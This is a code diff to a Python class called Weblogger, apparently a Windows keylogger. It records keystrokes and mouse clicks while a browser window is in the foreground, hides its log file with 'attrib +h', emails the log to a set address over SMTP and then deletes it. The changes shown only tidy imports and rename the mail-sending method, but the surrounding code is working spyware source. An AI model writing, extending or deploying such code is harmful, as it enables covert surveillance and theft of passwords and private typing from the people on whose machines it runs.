@@ -2,12 +2,11 @@
 
 from win32gui import GetWindowText, GetForegroundWindow
 from time import sleep
-from os import path, environ, remove
 from pynput.keyboard import Key, Listener
 from pynput.mouse import Button, Listener as mouseListener
+import os
 import re
 import signal
-import sys
 import subprocess
 
 
@@ -22,7 +21,7 @@ class Weblogger(object):
                    Key.esc, Key.home, Key.end]
 
     def __init__(self, email_to=""):
-        self.log_file = path.join(environ['userprofile'], 'log.txt')
+        self.log_file = os.path.join(os.environ['userprofile'], 'log.txt')
         self.email_to = email_to
         self.w_name = ""
         self.w_title = ""
@@ -37,7 +36,7 @@ class Weblogger(object):
         subprocess.call('attrib +h ' + self.log_file, shell=True)
 
     def create_file(self):
-        if not path.exists(self.log_file):
+        if not os.path.exists(self.log_file):
             self.last_title = ""
             self.browser_title = ""
 
@@ -75,8 +74,8 @@ class Weblogger(object):
 
     def kill(self, sig=None, frame=None):
         self.is_thread_running = False
-        self.send_log()
-        sys.exit()
+        self.force_send_mail()
+        os._exit(0)
 
     def on_press(self, key):
         if not self.is_browser_open():
@@ -165,10 +164,10 @@ class Weblogger(object):
         server.sendmail(email_from, self.email_to, msg.as_string())
         server.quit()
 
-        remove(self.log_file)
+        os.remove(self.log_file)
         self.create_file()
 
-    def send_log(self):
+    def force_send_mail(self):
         with open(self.log_file, 'r') as lf:
             data = lf.read()
             data_length = len(data)
